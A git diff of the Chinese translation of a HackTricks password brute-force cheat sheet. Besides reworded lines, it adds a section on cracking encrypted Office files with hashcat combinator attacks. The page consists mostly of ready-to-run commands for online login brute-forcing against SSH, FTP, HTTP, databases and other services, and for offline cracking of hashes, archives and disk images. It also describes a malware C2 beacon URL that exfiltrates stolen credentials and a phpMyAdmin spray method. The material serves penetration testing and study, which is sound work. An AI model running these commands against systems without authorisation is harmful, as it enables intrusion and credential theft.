@@ -1,4 +1,4 @@
-# Brute Force - 速查表
+# Brute Force - CheatSheet
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -21,7 +21,7 @@
 
 ## **创建自己的字典**
 
-尽可能收集有关目标的信息，并生成自定义字典。以下工具可能会有所帮助：
+尽可能多地收集目标信息，并生成自定义字典。以下工具可能会有所帮助：
 
 ### Crunch
 ```bash
@@ -34,7 +34,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### 基于网站的 wordlists
+### 基于网站的字典
 ```bash
 # Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
@@ -53,7 +53,7 @@ python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-一个 wordlist 生成工具，允许你提供一组单词，并根据这些单词生成多种变体，从而创建适用于特定 target 的独特且理想的 wordlist。
+一个 wordlist 生成工具，允许你提供一组单词，并根据这些单词创建多种变体，从而生成适用于特定目标的独特且理想的 wordlist。
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -74,7 +74,7 @@ Finished in 0.920s.
 ```
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Wordlists
+### 字典
 
 - [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 - [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -87,19 +87,19 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Internet-wide bruteforcer workflow（基于 Go-based scanners 的经验）
+## Internet-wide bruteforcer 工作流（Go-based scanners 的经验）
 
-以下行为是在 GoBruteforcer malware 的 scanning workflow 中观察到的；具体数值因样本而异。<sup>[[1]](#references)</sup>
+在 GoBruteforcer malware 的扫描工作流中观察到了以下行为；具体数值因样本而异。<sup>[[1]](#references)</sup>
 
-- 维护**针对架构调优的 worker pools**（例如，`x86_64/arm64` 上使用 95 个 concurrent workers，`i686` 上使用 85 个，`armv5tel` 上使用 35 个，其他架构默认使用 50 个），每秒检查一次 active workers，并在数量低于目标时生成 replacement；每个 worker 最多处理一个 target IP，然后退出。
-- 生成**随机 public IPv4**，但排除明显不可路由以及 operator 特意避免的网段：RFC1918、`100.64.0.0/10`、`127.0.0.0/8`、`0.0.0.0/8`、`169.254.0.0/16`、`198.18.0.0/15`、multicast `>=224.0.0.0/4`、cloud-heavy `/8`（`3/15/16/56`）以及与 DoD 相关的 `/8`（`6/7/11/21/22/26/28/29/30/33/55/214/215`）。
-- 在尝试**cleartext logins**（FTP/21、MySQL/3306、Postgres/5432、通过 HTTP/80 访问的 phpMyAdmin）之前，使用较短的 timeout（约 2 秒）**probe service port**；如果 C2 credential fetch 失败，则回退到**small builtin credential list**。
-- 通过微小的 HTTP GET beacon **exfiltrate hits**，例如 `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>`（service codes 如 `1=PMA`、`2=MySQL`、`3=FTP`、`4=Postgres`），同时复用通用的 browser User-Agent 以融入正常流量。
-- **phpMyAdmin spray** 可以对约 80 个可能的 path 执行 brute-force，并使用 `GET /index.php?lang=en`，检测 PMA markers（`pmahomme` theme/`phpmyadmin.css`/`navigation.php`），解析 `codemirror.css?v=X.Y.Z` 以选择 auth 流程：版本 `<4.9` 接受 GET params `pma_username`/`pma_password`；版本 `>=4.9` 使用带有 `server=1`、CSRF `token` 以及相同 credentials 的 POST。
+- 维护**针对架构调优的 worker pool**（例如，在 `x86_64/arm64` 上使用 95 个并发 worker，在 `i686` 上使用 85 个，在 `armv5tel` 上使用 35 个，在其他架构上默认使用 50 个），每秒检查一次活跃 worker 数量，并在低于目标值时生成替代 worker；每个 worker 最多处理一个目标 IP，然后退出。
+- 生成**随机公共 IPv4 地址**，但排除明显不可路由的地址和 operator 主动避开的特定范围：RFC1918、`100.64.0.0/10`、`127.0.0.0/8`、`0.0.0.0/8`、`169.254.0.0/16`、`198.18.0.0/15`、多播地址 `>=224.0.0.0/4`、云服务密集的 `/8`（`3/15/16/56`）以及与 DoD 相关的 `/8`（`6/7/11/21/22/26/28/29/30/33/55/214/215`）。
+- 在尝试**明文登录**（FTP/21、MySQL/3306、Postgres/5432、通过 HTTP/80 访问的 phpMyAdmin）之前，以较短的超时时间（约 2 秒）**探测服务端口**；如果 C2 凭据获取失败，则回退到**内置的小型凭据列表**。
+- 通过小型 HTTP GET beacon **外传命中结果**，例如 `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>`（服务代码如 `1=PMA`、`2=MySQL`、`3=FTP`、`4=Postgres`），同时复用常见浏览器 User-Agent 以混入正常流量。
+- **phpMyAdmin spray** 可以对约 80 个可能的路径执行 brute-force，并使用 `GET /index.php?lang=en`；检测 PMA 标记（`pmahomme` theme/`phpmyadmin.css`/`navigation.php`），解析 `codemirror.css?v=X.Y.Z` 后分支处理认证：版本 `<4.9` 接受 GET 参数 `pma_username`/`pma_password`；版本 `>=4.9` 使用带有 `server=1`、CSRF `token` 以及相同凭据的 POST。
 
-## Services
+## 服务
 
-按 service name 的字母顺序排列。
+按服务名称的字母顺序排列。
 
 ### AFP
 ```bash
@@ -115,7 +115,7 @@ msf> run
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
-### AMQP（ActiveMQ、RabbitMQ、Qpid、JORAM 和 Solace）
+### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
@@ -155,7 +155,7 @@ legba ftp --username admin --password wordlists/passwords.txt --target localhost
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
-### HTTP Basic Auth
+### HTTP 基本认证
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
 # Use https-get mode for https
@@ -167,14 +167,14 @@ legba http.basic --username admin --password wordlists/passwords.txt --target ht
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - Post Form
+### HTTP - POST 表单
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-对于 http**s**，你必须将 "http-post-form" 更改为 "**https-post-form"**
+对于 http**s**，你必须将 "http-post-form" 更改为 "**https-post-form**"
 
-### **HTTP - CMS --** (W)ordpress、(J)oomla、(D)rupal 或 (M)oodle
+### **HTTP - CMS --** (W)ordpress、(J)oomla 或 (D)rupal 或 (M)oodle
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
@@ -291,11 +291,11 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-要使用 **oracle_login** 配合 **patator**，你需要**安装**：
+要使用 **patator** 的 **oracle_login**，需要先**安装**：
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
-[离线 OracleSQL hash brute-force](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
+[离线 OracleSQL 哈希暴力破解](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force)（**版本 11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2、**和**11.2.0.3**）：
 ```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
 ```
@@ -417,13 +417,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### Weak SSH keys / Debian predictable PRNG
+#### 弱 SSH keys / Debian predictable PRNG
 
-某些系统在用于生成加密材料的随机种子方面存在已知缺陷。这可能导致密钥空间大幅缩小，从而可以使用 [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) 等工具进行暴力破解。也可以使用预先生成的弱密钥集合，例如 [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)。
+某些系统在生成加密材料时使用的随机种子存在已知缺陷。这可能导致 keyspace 大幅缩减，从而可以使用 [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) 等工具进行暴力破解。预生成的弱 keys 集合也可以获取，例如 [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)。
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
+### STOMP（ActiveMQ、RabbitMQ、HornetQ 和 OpenMQ）
 
-STOMP 文本协议是一种广泛使用的消息传递协议，**允许与 RabbitMQ、ActiveMQ、HornetQ 和 OpenMQ 等流行的消息队列服务进行无缝通信和交互**。它提供了一种标准化且高效的方式，用于交换消息并执行各种消息传递操作。
+STOMP 文本协议是一种广泛使用的消息传递协议，**支持与 RabbitMQ、ActiveMQ、HornetQ 和 OpenMQ 等常用消息队列服务进行无缝通信和交互**。它提供了一种标准化且高效的方法，用于交换消息并执行各种消息传递操作。
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -477,7 +477,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-在尝试对 Hash 进行 brute force 之前，先查看此内容。
+在尝试 brute force Hash 之前，先查看这里。
 
 ### ZIP
 ```bash
@@ -497,7 +497,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### Known plaintext zip attack
 
-你需要知道加密 zip 中**某个文件的明文**（或部分明文）。你可以运行 **`7z l encrypted.zip`** 来检查加密 zip **内部文件的文件名和大小**\
+你需要知道加密 zip 中**包含的文件的 plaintext**（或部分 plaintext）。你可以运行以下命令，检查加密 zip 中**包含的文件名和文件大小**：**`7z l encrypted.zip`**\
 从 releases 页面下载 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)。
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -530,9 +530,9 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
-### PDF Owner 密码
+### PDF Owner Password
 
-要破解 PDF Owner 密码，请查看：[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+要破解 PDF Owner password，请查看此链接：[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -546,7 +546,7 @@ python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5h
 python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
 john jwt.john #It does not work with Kali-John
 ```
-### NTLM cracking
+### NTLM 破解
 ```bash
 Format:USUARIO:ID:HASH_LM:HASH_NT:::
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
@@ -566,18 +566,18 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### LUKS 镜像
+### Lucks image
 
 #### 方法 1
 
-安装: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
+安装：[https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
 bruteforce-luks -f ./list.txt ./backup.img
 cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-#### 方法 2
+#### Method 2
 ```bash
 cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
 dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
@@ -607,11 +607,11 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 使用 [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)，然后使用 john
 
-### Open Office 密码保护的列
+### Open Office Pwd Protected Column
 
-如果你有一个包含受密码保护列的 xlsx 文件，可以解除保护：
+如果你有一个包含受密码保护列的 xlsx 文件，可以解除其保护：
 
-- **将其上传到 google drive**，密码会被自动移除
+- **将其上传到 Google Drive**，密码会被自动移除
 - 要**手动移除**：
 ```bash
 unzip file.xlsx
@@ -630,7 +630,7 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
 ## 工具
 
-**Hash 示例：** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
+**Hash 示例:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
 ### Hash-identifier
 ```bash
@@ -646,7 +646,7 @@ hash-identifier
 
 ### **字典生成工具**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 可配置基础字符、键盘布局和路径的高级键盘遍历生成器。
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 可配置基础字符、键盘布局和路线的高级键盘遍历生成器。
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
@@ -663,14 +663,14 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 - **Wordlist attack** (`-a 0`) with rules
 
-**Hashcat** 已自带一个**包含规则的文件夹**，但你也可以在[**这里找到其他有趣的规则**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
+**Hashcat** 已经自带一个**包含 rules 的文件夹**，但你也可以在[**other interesting rules here**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)找到其他有趣的 rules。
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 - **Wordlist combinator** attack
 
 可以使用 hashcat 将 **2 个 wordlist 合并为 1 个**。\
-如果列表 1 包含单词 **"hello"**，列表 2 包含 2 行，分别为单词 **"world"** 和 **"earth"**，则会生成 `helloworld` 和 `helloearth`。
+如果 list 1 中包含单词 **"hello"**，而第二个 list 包含两行，分别是单词 **"world"** 和 **"earth"**，则会生成 `helloworld` 和 `helloearth`。
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -681,6 +681,31 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
 ## hello-earth!
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
 ```
+#### Grammar-driven combinator attacks（encrypted Office 示例）
+
+密码即使很长并包含多个字符类别，只要遵循已知语法，其**有效搜索空间**仍可能很小。对于在授权 assessment 期间获取的加密 Office 文档，`office2john.py` 会提取密码验证记录；这使得无需受到 online lockout、throttling 或 MFA 限制即可进行本地猜测。它不会绕过文档加密。<sup>[[2]](#references)[[5]](#references)</sup>
+
+移除 John 添加的文件名字段，使 Hashcat 仅接收验证器：<sup>[[2]](#references)</sup>
+```bash
+python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
+head -c 40 office.hash; echo
+```
+从提取的前缀中选择 `-m`，而不是根据文件扩展名选择。Hashcat 将 `$office$*2007*`、`$office$*2010*` 和 `$office$*2013*` 映射到模式 `9400`、`9500` 和 `9600`；旧版的 `$oldoffice$0/$1` 和 `$oldoffice$3/$4` 记录分别使用模式 `9700` 和 `9800`。<sup>[[3]](#references)</sup>
+
+如果通过密码复用、策略、提示信息或熟悉该用户的人员获取的情报表明存在类似 `<word><number><optional !><word>` 的语法，则将可独立枚举的前缀生成并作为左侧字典。此示例测试 `0` 到 `99` 的数字；应根据评估中的证据替换范围和转换方式。<sup>[[5]](#references)</sup>
+```bash
+while IFS= read -r word; do
+for number in $(seq 0 99); do
+printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
+done
+done < words.txt > wordsAndNumbers.txt
+```
+Hashcat attack mode `1` 会将右侧字典中的每一行追加到左侧字典中的每一行，因此包含 `L` 行和 `R` 行的文件会在应用任何规则之前生成 `L × R` 个候选项。以下命令专用于旧版 `$oldoffice$3/$4` 记录；对于其他 Office 格式，请更改 mode。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+```bash
+hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
+```
+这种预处理模式也适用于其他可离线验证的格式：仅枚举一个组件中合理的大小写、日期、分隔符、数字或标点组合，然后将其与剩余组件结合，而不是对名义上的完整长度进行 brute-force。<sup>[[4]](#references)[[5]](#references)</sup>
+
 - **Mask attack** (`-a 3`)
 ```bash
 # Mask attack with simple mask
@@ -713,7 +738,7 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 ## Use it to crack the password
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
-- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) attack攻撃
+- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) 攻击
 ```bash
 # Mask numbers will be appended to each word in the wordlist
 hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
@@ -725,19 +750,19 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-破解 Linux 哈希值 - /etc/shadow 文件
+破解 Linux 哈希 - /etc/shadow 文件
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-破解 Windows 哈希值
+破解 Windows 哈希
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-破解常见应用程序哈希
+破解常见应用程序哈希值
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -749,5 +774,9 @@ hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
 ## References
 
-- [1] [深入了解 GoBruteforcer：AI 生成的服务器默认配置、弱密码和专注于加密货币的活动](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [1] [深入解析 GoBruteforcer：AI 生成的服务器默认配置、弱密码与加密货币导向的攻击活动](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [2] [John the Ripper：`office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
+- [3] [Hashcat 示例哈希值和 Microsoft Office 模式](https://hashcat.net/wiki/doku.php?id=example_hashes)
+- [4] [Hashcat 组合攻击](https://hashcat.net/wiki/doku.php?id=combinator_attack)
+- [5] [凭据的遗产规划](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
 {{#include ../banners/hacktricks-training.md}}
